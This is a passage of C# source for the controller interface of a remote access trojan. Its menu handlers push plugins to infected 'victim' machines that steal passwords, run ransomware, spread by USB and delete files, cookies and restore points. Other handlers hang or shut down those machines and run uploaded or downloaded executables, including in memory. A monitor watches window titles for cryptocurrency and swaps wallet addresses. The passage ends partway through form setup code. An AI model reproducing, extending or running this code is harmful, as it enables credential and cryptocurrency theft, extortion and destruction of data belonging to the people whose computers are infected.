            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\ScanNET.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                ScanNET scanNET = (ScanNET)Application.OpenForms["ScanNET:" + clients.ID];
                if (scanNET == null)
                {
                    scanNET = new ScanNET
                    {
                        Name = "ScanNET:" + clients.ID,
                        Text = "Internet speed : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    scanNET.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void PasswordsContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Passwords.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                Passwords passwords = (Passwords)Application.OpenForms["Passwords:" + clients.ID];
                if (passwords == null)
                {
                    passwords = new Passwords
                    {
                        Name = "Passwords:" + clients.ID,
                        Text = "Passwords : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    passwords.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    public string GetTitleWindowsActive()
    {
        try
        {
            string text = string.Empty;
            foreach (DataGridViewRow item in (IEnumerable)ListScanActiveAddresses.Rows)
            {
                if (!item.IsNewRow)
                {
                    text = text + item.Cells[0].Value.ToString() + ",";
                }
            }
            return text;
        }
        catch
        {
            return "BTC,ETH,XMR,$";
        }
    }

    private void MonitorStartContex_Click(object sender, EventArgs e)
    {
        try
        {
            Clients[] selectedClients = GetSelectedClients();
            int num = 0;
            while (true)
            {
                if (num < selectedClients.Length)
                {
                    Clients clients = selectedClients[num];
                    if (clients.DGV.Cells[11].Value.ToString() == "ON")
                    {
                        break;
                    }
                    num++;
                    continue;
                }
                if (ListScanActiveAddresses.Rows.Count == 0)
                {
                    MessageBox.Show(this, "Please add addresses to the list to be wiretapped", "Monitor!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                    return;
                }
                lock (Settings.LockReportWindowClients)
                {
                    Settings.ReportWindowClients.Clear();
                    Settings.ReportWindowClients = new List<Clients>();
                }
                Settings.ReportWindow = true;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "reportWindow";
                msgPack.ForcePathObject("Option").AsString = "run";
                msgPack.ForcePathObject("Delay").AsString = DelayMonitor.Text;
                msgPack.ForcePathObject("Title").AsString = GetTitleWindowsActive();
                msgPack.ForcePathObject("IsCurrencyGrabber").AsString = TlogCurrencyGrabber.Checked.ToString();
                msgPack.ForcePathObject("BTC").AsString = TextBTC.Text;
                msgPack.ForcePathObject("ETH").AsString = TextETH.Text;
                msgPack.ForcePathObject("LTC").AsString = TextLTC.Text;
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients2 = GetSelectedClients();
                foreach (Clients clients2 in selectedClients2)
                {
                    ThreadPool.QueueUserWorkItem(clients2.Send, msgPack2.Encode2Bytes());
                    clients2.DGV.Cells[11].Style.ForeColor = Color.Black;
                    clients2.DGV.Cells[11].Style.SelectionForeColor = Color.Green;
                    clients2.DGV.Cells[11].Style.BackColor = Color.Green;
                    clients2.DGV.Cells[11].Value = "ON";
                }
                return;
            }
            MessageBox.Show(this, "The observer is already running", "Monitor!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }
    }

    private void MonitorStopContex_Click(object sender, EventArgs e)
    {
        try
        {
            Clients[] selectedClients = GetSelectedClients();
            int num = 0;
            while (true)
            {
                if (num < selectedClients.Length)
                {
                    Clients clients = selectedClients[num];
                    if (clients.DGV.Cells[11].Value.ToString() == "OFF")
                    {
                        break;
                    }
                    num++;
                    continue;
                }
                Settings.ReportWindow = false;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "reportWindow";
                msgPack.ForcePathObject("Option").AsString = "stop";
                lock (Settings.LockReportWindowClients)
                {
                    foreach (Clients reportWindowClient in Settings.ReportWindowClients)
                    {
                        ThreadPool.QueueUserWorkItem(reportWindowClient.Send, msgPack.Encode2Bytes());
                    }
                }
                foreach (DataGridViewRow selectedRow in ClientsList.SelectedRows)
                {
                    selectedRow.Cells[11].Style.ForeColor = Color.Black;
                    selectedRow.Cells[11].Style.SelectionForeColor = Color.Red;
                    selectedRow.Cells[11].Style.BackColor = Color.Red;
                    selectedRow.Cells[11].Value = "OFF";
                }
                return;
            }
            MessageBox.Show(this, "The observer is already stoped", "Monitor!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.ToString());
        }
    }

    private void OptionsContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\OptionsForm.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                Options options = (Options)Application.OpenForms["OptionsForm:" + clients.ID];
                if (options == null)
                {
                    options = new Options
                    {
                        Name = "OptionsForm:" + clients.ID,
                        Text = "Options : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    options.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SystemHangContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to hang the client computer?", "Hang System!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "pc";
                msgPack.ForcePathObject("PCOption").AsString = "SystemHang";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SystemLogoffContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to hang the client computer?", "System SignOut!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult != DialogResult.Yes)
            {
                return;
            }
            string text = Interaction.InputBox("Enter a message to be shown to the client before logging out", "System Sign Out", string.Empty);
            if (text.Length > 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "pc";
                msgPack.ForcePathObject("PCOption").AsString = "SignOut";
                msgPack.ForcePathObject("Mesg").AsString = text;
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SystemRestartContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to restart the client computer?", "System Restart!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "pc";
                msgPack.ForcePathObject("PCOption").AsString = "restart";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SystemShutdownContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to Shut down the client computer?", "System Shut down!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "pc";
                msgPack.ForcePathObject("PCOption").AsString = "shutdown";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void USBSpreadContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to spread usb the client computer?", "Spread USB!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "USB";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RansomwareContex_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Ransom.dll");
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                Bitmap logo = (Bitmap)clients.DGV.Cells[0].Value;
                Ransomware ransomware = (Ransomware)Application.OpenForms["Ransom:" + clients.ID];
                if (ransomware == null)
                {
                    ransomware = new Ransomware
                    {
                        Name = "Ransom:" + clients.ID,
                        Text = "Ransomware : " + clients.Ip,
                        F = this,
                        ParentClient = clients,
                        Logo = logo
                    };
                    ransomware.Show();
                    ThreadPool.QueueUserWorkItem(clients.Send, msgPack.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void DeleteAllFilesContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to delete files the client computer?", "Delete Files!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "DeleteFiles";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void DeleteCookiesContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to delete cookies the client computer?", "Delete Cookies!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "DeleteCookies";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void DeleteSystemRestoreContex_Click(object sender, EventArgs e)
    {
        try
        {
            Clients[] selectedClients = GetSelectedClients();
            int num = 0;
            while (true)
            {
                if (num < selectedClients.Length)
                {
                    Clients clients = selectedClients[num];
                    if (clients.DGV.Cells[8].Value.ToString() == "Inactive")
                    {
                        break;
                    }
                    num++;
                    continue;
                }
                DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to delete system restore the client computer?", "Delete System restore!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (dialogResult == DialogResult.Yes)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Packet").AsString = "DeleteSystemRestore";
                    MsgPack msgPack2 = new MsgPack();
                    msgPack2.ForcePathObject("Packet").AsString = "plugin";
                    msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                    msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                    Clients[] selectedClients2 = GetSelectedClients();
                    foreach (Clients @object in selectedClients2)
                    {
                        ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                    }
                }
                return;
            }
            MessageBox.Show(this, "This feature requires administrator privileges, please run the client as an administrator", "Delete System restore!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void VisitWebsiteContex_Click(object sender, EventArgs e)
    {
        try
        {
            string text = Interaction.InputBox("Visit Website", "URL", "www.google.com");
            if (!string.IsNullOrEmpty(text))
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "visitURL";
                msgPack.ForcePathObject("URL").AsString = text;
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void ChagneLogoClientContex_Click(object sender, EventArgs e)
    {
        try
        {
            Invoke((MethodInvoker)delegate
            {
                lock (Settings.LockListviewClients)
                {
                    if (ClientsList.SelectedRows.Count == 0)
                    {
                        return;
                    }
                    foreach (DataGridViewRow selectedRow in ClientsList.SelectedRows)
                    {
                        Bitmap imageLogo_ = (Bitmap)selectedRow.Cells[0].Value;
                        string nickname_ = selectedRow.Cells[1].Value.ToString();
                        string text = selectedRow.Cells[2].Value.ToString();
                        ChangeLogo changeLogo = (ChangeLogo)Application.OpenForms["Change Logo:" + selectedRow.Cells[2].Value];
                        if (changeLogo == null)
                        {
                            changeLogo = new ChangeLogo
                            {
                                Name = "ChangeLogo:" + text,
                                Text = "Change Logo:",
                                ImageLogo_ = imageLogo_,
                                Nickname_ = nickname_,
                                UserID_ = text
                            };
                            changeLogo.Show();
                        }
                    }
                }
            });
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RenameClientContex_Click(object sender, EventArgs e)
    {
        string text = Interaction.InputBox("Enter New Name", "Rename Victim", string.Empty);
        if (text.Length <= 0)
        {
            return;
        }
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "rename";
            msgPack.ForcePathObject("Nackname").AsString = text;
            MsgPack msgPack2 = new MsgPack();
            msgPack2.ForcePathObject("Packet").AsString = "plugin";
            msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
            msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
            Clients[] selectedClients = GetSelectedClients();
            foreach (Clients clients in selectedClients)
            {
                ThreadPool.QueueUserWorkItem(clients.Send, msgPack2.Encode2Bytes());
                clients.DGV.Cells[1].Value = text;
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void UpdateClientContex_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Exe |*.exe"
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                byte[] asBytes = Zip.Compress(File.ReadAllBytes(openFileDialog.FileName));
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "update";
                msgPack.ForcePathObject("EXC").AsString = Path.GetExtension(openFileDialog.FileName);
                msgPack.ForcePathObject("BytesClient").SetAsBytes(asBytes);
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void RestartClientContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to restart client ?", "Restart Client!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "restart";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void CloseClientContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to close client ?", "Close Client!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "close";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void UnistallClientContex_Click(object sender, EventArgs e)
    {
        try
        {
            DialogResult dialogResult = MessageBox.Show(this, "Are you sure you still want to unistall client ?", "Unistall Client!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dialogResult == DialogResult.Yes)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "uninstall";
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SendFileToDiskContex_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Exe |*.exe"
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                byte[] asBytes = Zip.Compress(File.ReadAllBytes(openFileDialog.FileName));
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "ToDisk";
                msgPack.ForcePathObject("EXC").AsString = Path.GetExtension(openFileDialog.FileName);
                msgPack.ForcePathObject("BytesFile").SetAsBytes(asBytes);
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SendFileRunPEContex_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Exe |*.exe"
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                byte[] asBytes = Zip.Compress(File.ReadAllBytes(openFileDialog.FileName));
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "RunPE";
                msgPack.ForcePathObject("EXC").AsString = Path.GetExtension(openFileDialog.FileName);
                msgPack.ForcePathObject("BytesFile").SetAsBytes(asBytes);
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SendFileFromURLContex_Click(object sender, EventArgs e)
    {
        try
        {
            string text = Interaction.InputBox("Executing a file using a direct link", "Direct link");
            if (!string.IsNullOrEmpty(text))
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "FromURL";
                msgPack.ForcePathObject("URL").AsString = text;
                msgPack.ForcePathObject("EXC").AsString = Path.GetExtension(text);
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void SendFileToMemoryContex_Click(object sender, EventArgs e)
    {
        try
        {
            OpenFileDialog openFileDialog = new OpenFileDialog
            {
                Filter = "Exe |*.exe"
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                byte[] asBytes = Zip.Compress(File.ReadAllBytes(openFileDialog.FileName));
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Memory";
                msgPack.ForcePathObject("EXC").AsString = Path.GetExtension(openFileDialog.FileName);
                msgPack.ForcePathObject("BytesFile").SetAsBytes(asBytes);
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "plugin";
                msgPack2.ForcePathObject("Dll").AsString = GetHash.GetChecksum("Plugins\\Options.dll");
                msgPack2.ForcePathObject("Dirct").SetAsBytes(msgPack.Encode2Bytes());
                Clients[] selectedClients = GetSelectedClients();
                foreach (Clients @object in selectedClients)
                {
                    ThreadPool.QueueUserWorkItem(@object.Send, msgPack2.Encode2Bytes());
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
    }

    private void OpenFolderDownloads_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsList.SelectedRows)
            {
                string text = Path.Combine(Application.StartupPath, "Clients", "Downloads\\" + selectedRow.Cells[1].Value?.ToString() + "_" + selectedRow.Cells[2].Value);
                if (Directory.Exists(text))
                {
                    Process.Start(text);
                }
            }
        }
        catch
        {
        }
    }

    private void OpenFolderPasswords_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsList.SelectedRows)
            {
                string text = Path.Combine(Application.StartupPath, "Clients", "Passwords\\" + selectedRow.Cells[1].Value?.ToString() + "_" + selectedRow.Cells[2].Value);
                if (Directory.Exists(text))
                {
                    Process.Start(text);
                }
            }
        }
        catch
        {
        }
    }

    private void OpenFolderKeyloagger_Click(object sender, EventArgs e)
    {
        try
        {
            foreach (DataGridViewRow selectedRow in ClientsList.SelectedRows)
            {
                string text = Path.Combine(Application.StartupPath, "Clients", "Keylogger\\" + selectedRow.Cells[1].Value?.ToString() + "_" + selectedRow.Cells[2].Value);
                if (Directory.Exists(text))
                {
                    Process.Start(text);
                }
            }
        }
        catch
        {
        }
    }

    private void FormSilver_FormClosing(object sender, FormClosingEventArgs e)
    {
        Settings.IsConnectedProxy = false;
        try
        {
            foreach (ProxyPacket item in list_1)
            {
                item.TcpListener_0.Stop();
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(ex.Message);
        }
        TransitionHiddeng.HideSync(panelForm);
        Process.GetCurrentProcess().Kill();
        Application.Exit();
        try
        {
            string text = "taskkill /F /IM " + Path.GetFileName(Application.ExecutablePath);
            ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c " + text)
            {
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process process = new Process();
            process.StartInfo = startInfo;
            process.Start();
        }
        catch
        {
        }
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation1 = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormSilver));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties1 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
